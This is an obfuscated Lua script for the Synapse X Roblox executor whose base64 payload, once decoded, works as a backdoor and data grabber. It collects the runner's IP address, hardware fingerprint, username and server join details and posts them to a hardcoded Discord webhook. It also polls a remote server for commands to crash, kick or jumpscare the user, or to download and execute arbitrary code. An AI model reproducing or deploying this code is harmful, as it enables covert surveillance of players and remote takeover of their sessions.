loadstring(syn.crypt.base64.decode("aWYgbm90IGdhbWU6SXNMb2FkZWQoKSB0aGVuCiAgICBnYW1lLkxvYWRlZDpXYWl0KCkKZW5kCmxvY2FsIHNlbGZMaW5rID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pYW10cnlpbmd0b2ZpbmRuYW1lL0VBQUMvbWFpbi9tYWluLmx1YSIKbG9jYWwgc3RhdHVzID0gImh0dHBzOi8vYXBpLnJkMmdsb3J5LmNvbS9lYWFjIgpzeW4ucXVldWVfb25fdGVsZXBvcnQoImxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCciLi5zZWxmTGluay4uIicsdHJ1ZSkpKCkiKQpsb2NhbCBwbGFjZUlkID0gZ2FtZS5QbGFjZUlkCmxvY2FsIGdhbWVOYW1lID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKTpHZXRQcm9kdWN0SW5mbyhwbGFjZUlkKS5OYW1lCmxvY2FsIGh3aWQgZG8KICAgIGxvY2FsIGJvZHkgPSBzeW4ucmVxdWVzdCh7VXJsID0gJ2h0dHBzOi8vaHR0cGJpbi5vcmcvZ2V0JzsgTWV0aG9kID0gJ0dFVCd9KS5Cb2R5OwogICAgbG9jYWwgZGVjb2RlZCA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORGVjb2RlKGJvZHkpCiAgICBod2lkID0gZGVjb2RlZC5oZWFkZXJzWyJTeW4tRmluZ2VycHJpbnQiXQplbmQKCmxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCmxvY2FsIHRpbWVGb3JtYXQgPSAiaGg6bW0gQSBvbiBkZGRkIE1NL0REL1lZWVkiCmxvY2FsIG5vdyA9IERhdGVUaW1lLm5vdygpCmxvY2FsIGlwID0gdG9zdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciLCB0cnVlKSkKbG9jYWwgX3RfID0gbm93OkZvcm1hdExvY2FsVGltZSh0aW1lRm9ybWF0LCJlbi11cyIpLi4iIEVEVCIKbG9jYWwgdGh1bWJuYWlsID0gImh0dHBzOi8vd3d3LnJvYmxveC5jb20vaGVhZHNob3QtdGh1bWJuYWlsL2ltYWdlP3VzZXJJZD0iLi5wbGF5ZXIuVXNlcklkLi4iJndpZHRoPTQyMCZoZWlnaHQ9NDIwJmZvcm1hdD1wbmciCmlmIG5vdCBpc2ZpbGUoImVhYWMudHh0IikgdGhlbiB3cml0ZWZpbGUoImVhYWMudHh0IiwiIikgZW5kCmxvY2FsIGZ1bmN0aW9uIGdldEl0ZXJhdGlvbigpCiAgICByZXR1cm4gbWF0aC5mbG9vcihvcy5jbG9jaygpLzIpCmVuZAoKbG9jYWwgbGFzdCA9IGdldEl0ZXJhdGlvbigpCgpnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgbG9jYWwgaXRlcmF0aW9uID0gZ2V0SXRlcmF0aW9uKCkKICAgIGlmIGl0ZXJhdGlvbj5sYXN0IHRoZW4KICAgICAgICBsYXN0ID0gaXRlcmF0aW9uCiAgICAgICAgbG9jYWwgciA9IGdhbWU6SHR0cEdldChzdGF0dXMsdHJ1ZSkKICAgICAgICAtLXByaW50KHIpCiAgICAgICAgaWYgcmVhZGZpbGUoImVhYWMudHh0Iikgfj0gciB0aGVuCiAgICAgICAgICAgIHdyaXRlZmlsZSgiZWFhYy50eHQiLHIpCiAgICAgICAgICAgIGxvY2FsIG8sXyA9IHN0cmluZy5maW5kKHIsIjoiKQogICAgICAgICAgICBsb2NhbCB1c2VySWQgPSB0b251bWJlcihzdHJpbmcuc3ViKHIsMSxvLTEpKQogICAgICAgICAgICBpZiB1c2VySWQgYW5kIChwbGF5ZXIuVXNlcklkPT11c2VySWQgb3IgdXNlcklkPT0wKSB0aGVuCiAgICAgICAgICAgICAgICByID0gc3RyaW5nLnN1YihyLG8rMSwtMSkKICAgICAgICAgICAgICAgIGlmIHI6ZmluZCgianVtcHNjYXJlIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxhc3QgPSBtYXRoLmh1Z2UKICAgICAgICAgICAgICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lhbXRyeWluZ3RvZmluZG5hbWUvRUFBQy9tYWluL2FjdGlvbi5sdWEiLHRydWUpKSgpCiAgICAgICAgICAgICAgICBlbHNlaWYgcjpmaW5kKCJjbG9zZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOlNodXRkb3duKCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoOWU5KQogICAgICAgICAgICAgICAgZWxzZWlmIHI6ZmluZCgia2ljayIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsYXN0ID0gbWF0aC5odWdlCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICAgICAgcC5LaWNrKHAsIlVuZXhwZWN0ZWQgY2xpZW50IGJlaGF2aW9yIikKICAgICAgICAgICAgICAgIGVsc2VpZiByOmZpbmQoImNyYXNoIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxhc3QgPSBtYXRoLmh1Z2UKICAgICAgICAgICAgICAgICAgICByZXBlYXQgdW50aWwgbmlsCiAgICAgICAgICAgICAgICBlbHNlaWYgcjpmaW5kKCJzd2VhciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lhbXRyeWluZ3RvZmluZG5hbWUvU2NyaXB0czgvbWFpbi9kdW1wL3N3ZWFyLmx1YSIsdHJ1ZSkpKCkKICAgICAgICAgICAgICAgIGVsc2VpZiByOmZpbmQoImFjdGl2ZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBub3RoaW5nCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBsb2Fkc3RyaW5nKHIpKCkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgcjpmaW5kKCJkaXNhYmxlIikgdGhlbgogICAgICAgICAgICBsb2NhbCBwID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgcC5LaWNrKHAsIlVuZXhwZWN0ZWQgY2xpZW50IGJlaGF2aW9yIikKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpsb2NhbCBkYXRhID0gewogICAgWyJlbWJlZHMiXSA9IHsKICAgICAgICB7CiAgICAgICAgICAgIFsidGl0bGUiXSA9ICJTeW5hcHNlIExvYWRlZCIsCiAgICAgICAgICAgIFsiZGVzY3JpcHRpb24iXSA9ICJBdHRhY2hlZCBJbiBfZ2FtZW5hbWVfIChfcGxhY2VpZF8pIiwKICAgICAgICAgICAgWyJ1cmwiXSA9ICJodHRwczovL3d3dy5yb2Jsb3guY29tL2dhbWVzL19wbGFjZWlkXy8iLAogICAgICAgICAgICBbImNvbG9yIl0gPSA2NTI4MCwKICAgICAgICAgICAgWyJmaWVsZHMiXSA9IHsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAiSFdJRCI7CiAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICJfaHdpZF8iOwogICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIklQIiwKICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIl9pcF8iLAogICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAiVmVyc2lvbiI7CiAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICJTeW5hcHNlIFgiOwogICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIkpvaW4gU2NyaXB0IjsKICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gImBgYGx1YVxuZ2FtZTpHZXRTZXJ2aWNlKCdUZWxlcG9ydFNlcnZpY2UnKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZShfcGxhY2VpZF8sICdfam9iaWRfJylcbmBgYCI7CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICB9OwogICAgICAgICAgICBbImF1dGhvciJdID0gewogICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAiQF9uYW1lXyAoX2Rpc3BsYXluYW1lXykiLAogICAgICAgICAgICAgICAgWyJ1cmwiXSA9ICJodHRwczovL3d3dy5yb2Jsb3guY29tL3VzZXJzL191c2VyaWRfL3Byb2ZpbGUiCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIFsiZm9vdGVyIl09IHsKICAgICAgICAgICAgICAgIFsidGV4dCJdID0gIl90aW1lXyIKICAgICAgICAgICAgfTsKICAgICAgICAgICAgWyJ0aHVtYm5haWwiXSA9IHsKICAgICAgICAgICAgICAgIFsidXJsIl0gPSAiX3RodW1ibmFpbF8iCiAgICAgICAgICAgIH07CiAgICAgICAgfQogICAgfQp9CgpkYXRhID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpOkpTT05FbmNvZGUoZGF0YSkKCmRhdGEgPSBzdHJpbmcuZ3N1YihkYXRhLCJfZ2FtZW5hbWVfIixnYW1lTmFtZSkKZGF0YSA9IHN0cmluZy5nc3ViKGRhdGEsIl9wbGFjZWlkXyIsdG9zdHJpbmcocGxhY2VJZCkpCmRhdGEgPSBzdHJpbmcuZ3N1YihkYXRhLCJfaHdpZF8iLGh3aWQpCmRhdGEgPSBzdHJpbmcuZ3N1YihkYXRhLCJfaXBfIixpcCkKZGF0YSA9IHN0cmluZy5nc3ViKGRhdGEsIl9qb2JpZF8iLGdhbWUuSm9iSWQpCmRhdGEgPSBzdHJpbmcuZ3N1YihkYXRhLCJfbmFtZV8iLHBsYXllci5OYW1lKQpkYXRhID0gc3RyaW5nLmdzdWIoZGF0YSwiX2Rpc3BsYXluYW1lXyIscGxheWVyLkRpc3BsYXlOYW1lKQpkYXRhID0gc3RyaW5nLmdzdWIoZGF0YSwiX3RpbWVfIixfdF8pCmRhdGEgPSBzdHJpbmcuZ3N1YihkYXRhLCJfdGh1bWJuYWlsXyIsdGh1bWJuYWlsKQpkYXRhID0gc3RyaW5nLmdzdWIoZGF0YSwiX3VzZXJpZF8iLHBsYXllci5Vc2VySWQpCgpsb2NhbCB3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwMTgyODkwOTAzNTUwMTU3MTEvOXROTzB1SnpDUlNrV1NEZHZNSm1WZ0tLOVFFcV9UejBrSTFLamQwVkRSOEhQNFFnbVN1akdRLWtrYy1MQTlOUURQTWMiCgpzeW4ucmVxdWVzdCh7CiAgICBbIlVybCJdID0gd2ViaG9vazsKICAgIFsiTWV0aG9kIl0gPSAiUE9TVCI7CiAgICBbIkhlYWRlcnMiXSA9IHsKICAgICAgICBbJ0NvbnRlbnQtVHlwZSddID0gJ2FwcGxpY2F0aW9uL2pzb24nCiAgICB9OwogICAgWyJCb2R5Il0gPSBkYXRhOwp9KQ=="))()
